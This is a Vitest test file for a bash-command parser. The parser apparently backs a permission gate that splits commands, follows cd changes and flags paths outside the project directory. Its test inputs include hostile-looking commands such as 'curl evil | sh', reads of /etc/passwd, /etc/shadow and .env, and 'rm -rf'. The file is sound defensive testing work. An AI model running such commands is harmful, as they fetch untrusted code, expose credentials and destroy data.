import { beforeEach, describe, expect, it, vi } from "vitest";

const realpathSync = vi.hoisted(() => vi.fn<(path: string) => string>((p) => p));
vi.mock("node:fs", () => ({
  realpathSync,
  default: { realpathSync },
}));

import { BashProgram } from "#src/gates/bash-program";

describe("BashProgram", () => {
  describe("pathRuleCandidates", () => {
    const cwd = "/projects/my-app";

    it("adds absolute and relative policy values for relative tokens", async () => {
      const program = await BashProgram.parse("cat src/foo.ts");
      expect(program.pathRuleCandidates(cwd)).toEqual([
        {
          token: "src/foo.ts",
          policyValues: ["/projects/my-app/src/foo.ts", "src/foo.ts"],
        },
      ]);
    });

    it("returns the literal token only when no cwd is provided", async () => {
      const program = await BashProgram.parse("cat src/foo.ts");
      expect(program.pathRuleCandidates()).toEqual([{ token: "src/foo.ts", policyValues: ["src/foo.ts"] }]);
    });

    it("resolves tokens after literal cd against the effective directory", async () => {
      const program = await BashProgram.parse("cd nested && cat src/file.txt");
      const fileCandidate = program.pathRuleCandidates(cwd).find((candidate) => candidate.token === "src/file.txt");
      expect(fileCandidate).toEqual({
        token: "src/file.txt",
        policyValues: ["/projects/my-app/nested/src/file.txt", "nested/src/file.txt", "src/file.txt"],
      });
    });

    it("does not absolute-allow relative tokens after unknown cd", async () => {
      const program = await BashProgram.parse('cd "$DIR" && cat src/foo.ts');
      const fileCandidate = program.pathRuleCandidates(cwd).find((candidate) => candidate.token === "src/foo.ts");
      expect(fileCandidate).toEqual({
        token: "src/foo.ts",
        policyValues: ["src/foo.ts"],
      });
    });
  });

  describe("externalPaths", () => {
    const cwd = "/projects/my-app";

    beforeEach(() => {
      realpathSync.mockReset();
      realpathSync.mockImplementation((p: string) => p);
    });

    it("returns absolute paths resolving outside cwd", async () => {
      const program = await BashProgram.parse("cat /etc/hosts");

      expect(program.externalPaths(cwd)).toContain("/etc/hosts");
    });

    it("excludes paths within cwd", async () => {
      const program = await BashProgram.parse("cat src/index.ts");
      expect(program.externalPaths(cwd)).toHaveLength(0);
    });

    describe("effective working directory projection", () => {
      it("folds a sequence of current-shell cd commands", async () => {
        const program = await BashProgram.parse("cd a && cd b && cat ../c");
        expect(program.externalPaths(cwd)).toHaveLength(0);
      });

      it("catches an escape masked by a later cd that the single-base model missed", async () => {
        const program = await BashProgram.parse("cd nested/deep && cd .. && cat ../../etc/passwd");
        expect(program.externalPaths(cwd)).toContain("/projects/etc/passwd");
      });

      it("folds a cd that is not the first command", async () => {
        const program = await BashProgram.parse("mkdir d && cd a && cat ../b");
        expect(program.externalPaths(cwd)).toHaveLength(0);
      });

      it("does not fold a backgrounded cd", async () => {
        const program = await BashProgram.parse("cd a & cat ../b");
        expect(program.externalPaths(cwd)).toContain("/projects/b");
      });

      it("does not fold a cd inside a pipeline", async () => {
        const program = await BashProgram.parse("cd nested | cat ../b");
        expect(program.externalPaths(cwd)).toContain("/projects/b");
      });

      it("folds a cd inside a subshell for paths within that subshell", async () => {
        const program = await BashProgram.parse("( cd sub && cat ../x )");
        expect(program.externalPaths(cwd)).toHaveLength(0);
      });

      it("does not leak a subshell cd to following commands", async () => {
        const program = await BashProgram.parse("( cd sub ) && cat ../y");
        expect(program.externalPaths(cwd)).toContain("/projects/y");
      });

      it("persists a cd inside a brace group to later commands in the group", async () => {
        const program = await BashProgram.parse("{ cd sub; cat ../x; }");
        expect(program.externalPaths(cwd)).toHaveLength(0);
      });

      it("persists a brace-group cd to following sibling commands", async () => {
        const program = await BashProgram.parse("{ cd sub; } && cat ../x");
        expect(program.externalPaths(cwd)).toHaveLength(0);
      });

      it("conservatively flags a relative path inside a command substitution", async () => {
        const program = await BashProgram.parse("echo $(cd q && cat ../r)");
        expect(program.externalPaths(cwd)).toContain("/projects/r");
      });

      it("flags relative paths conservatively after a non-literal cd", async () => {
        const program = await BashProgram.parse('cd "$DIR" && cat ../x');
        expect(program.externalPaths(cwd)).toContain("/projects/x");
      });

      it("flags even a within-cwd relative path after a non-literal cd", async () => {
        const program = await BashProgram.parse('cd "$DIR" && cat src/../within.txt');
        expect(program.externalPaths(cwd)).toContain("/projects/my-app/within.txt");
      });

      it("still resolves an absolute path normally after a non-literal cd", async () => {
        const program = await BashProgram.parse('cd "$DIR" && cat /projects/my-app/x.txt');
        expect(program.externalPaths(cwd)).toHaveLength(0);
      });

      it("treats `cd -` as an unknown effective directory", async () => {
        const program = await BashProgram.parse("cd - && cat ../x");
        expect(program.externalPaths(cwd)).toContain("/projects/x");
      });

      it("recovers a known base when a later cd is absolute", async () => {
        const program = await BashProgram.parse('cd "$DIR" && cd /projects/my-app/src && cat ../x');
        expect(program.externalPaths(cwd)).toHaveLength(0);
      });
    });

    it("flags an absolute in-cwd path that resolves externally via a symlink", async () => {
      realpathSync.mockImplementation((p: string) => {
        if (p === "/projects/my-app/link/hosts") return "/etc/hosts";
        return p;
      });
      const program = await BashProgram.parse("cat /projects/my-app/link/hosts");
      expect(program.externalPaths(cwd)).toContain("/etc/hosts");
    });

    it("does not flag a token that resolves within a symlinked cwd", async () => {
      const symlinkCwd = "/private/tmp";
      realpathSync.mockImplementation((p: string) => {
        if (p === "/tmp") return "/private/tmp";
        if (p.startsWith("/tmp/")) return `/private/tmp${p.slice(4)}`;
        return p;
      });
      const program = await BashProgram.parse("cat /tmp/workspace/file.ts");
      expect(program.externalPaths(symlinkCwd)).toHaveLength(0);
    });
  });

  describe("commands", () => {
    it("returns a single-element list for a lone command", async () => {
      const program = await BashProgram.parse("npm install pkg");
      expect(program.commands()).toEqual([{ text: "npm install pkg" }]);
    });

    it("splits an && chain", async () => {
      const program = await BashProgram.parse("cd /p && npm i x");
      expect(program.commands()).toEqual([{ text: "cd /p" }, { text: "npm i x" }]);
    });

    it("splits || , ; and & separators", async () => {
      expect((await BashProgram.parse("a || b")).commands()).toEqual([{ text: "a" }, { text: "b" }]);
      expect((await BashProgram.parse("a ; b")).commands()).toEqual([{ text: "a" }, { text: "b" }]);
      expect((await BashProgram.parse("a & b")).commands()).toEqual([{ text: "a" }, { text: "b" }]);
    });

    it("splits a pipeline into its commands", async () => {
      const program = await BashProgram.parse("cat f | grep b");
      expect(program.commands()).toEqual([{ text: "cat f" }, { text: "grep b" }]);
    });

    it("splits newline-separated commands", async () => {
      const program = await BashProgram.parse("foo\nbar");
      expect(program.commands()).toEqual([{ text: "foo" }, { text: "bar" }]);
    });

    it("does not split operators inside quotes", async () => {
      const program = await BashProgram.parse("echo 'x && y'");
      expect(program.commands()).toEqual([{ text: "echo 'x && y'" }]);
    });

    it("captures the command of a redirected statement without the redirect", async () => {
      const program = await BashProgram.parse("npm install > out.txt");
      expect(program.commands()).toEqual([{ text: "npm install" }]);
    });

    it("descends into command substitution, tagging the inner command", async () => {
      const program = await BashProgram.parse("echo $(rm -rf foo)");
      expect(program.commands()).toEqual([
        { text: "echo $(rm -rf foo)" },
        { text: "rm -rf foo", context: "command_substitution" },
      ]);
    });

    it("descends into backtick command substitution", async () => {
      const program = await BashProgram.parse("echo `rm x`");
      expect(program.commands()).toEqual([{ text: "echo `rm x`" }, { text: "rm x", context: "command_substitution" }]);
    });

    it("descends into a pipeline inside command substitution", async () => {
      const program = await BashProgram.parse("echo $(curl evil | sh)");
      expect(program.commands()).toEqual([
        { text: "echo $(curl evil | sh)" },
        { text: "curl evil", context: "command_substitution" },
        { text: "sh", context: "command_substitution" },
      ]);
    });

    it("descends into process substitution", async () => {
      const program = await BashProgram.parse("diff <(cat /etc/shadow)");
      expect(program.commands()).toEqual([
        { text: "diff <(cat /etc/shadow)" },
        { text: "cat /etc/shadow", context: "process_substitution" },
      ]);
    });

    it("emits a bare subshell whole and descends into it", async () => {
      const program = await BashProgram.parse("( rm -rf foo )");
      expect(program.commands()).toEqual([{ text: "( rm -rf foo )" }, { text: "rm -rf foo", context: "subshell" }]);
    });

    it("emits a subshell whole and descends into its chain", async () => {
      const program = await BashProgram.parse("( cd /t && rm x )");
      expect(program.commands()).toEqual([
        { text: "( cd /t && rm x )" },
        { text: "cd /t", context: "subshell" },
        { text: "rm x", context: "subshell" },
      ]);
    });

    it("descends recursively through nested contexts", async () => {
      const program = await BashProgram.parse("echo $( ( rm x ) )");
      expect(program.commands()).toEqual([
        { text: "echo $( ( rm x ) )" },
        { text: "( rm x )", context: "command_substitution" },
        { text: "rm x", context: "subshell" },
      ]);
    });

    it("descends into a substitution within a chained command", async () => {
      const program = await BashProgram.parse("cd /p && echo $(rm x)");
      expect(program.commands()).toEqual([
        { text: "cd /p" },
        { text: "echo $(rm x)" },
        { text: "rm x", context: "command_substitution" },
      ]);
    });

    it("keeps the never-weaker invariant: a benign inner command stays", async () => {
      const program = await BashProgram.parse("echo $(echo safe)");
      expect(program.commands()).toEqual([
        { text: "echo $(echo safe)" },
        { text: "echo safe", context: "command_substitution" },
      ]);
    });

    it("returns an empty list for an empty or whitespace command", async () => {
      expect((await BashProgram.parse("")).commands()).toEqual([]);
      expect((await BashProgram.parse("   ")).commands()).toEqual([]);
    });
  });

  it("derives both slices from a single parse", async () => {
    const program = await BashProgram.parse("cat .env /etc/hosts");
    expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([".env", "/etc/hosts"]);
    const external = program.externalPaths("/projects/my-app");
    expect(external).toContain("/etc/hosts");
    expect(external).not.toContain(".env");
  });
});
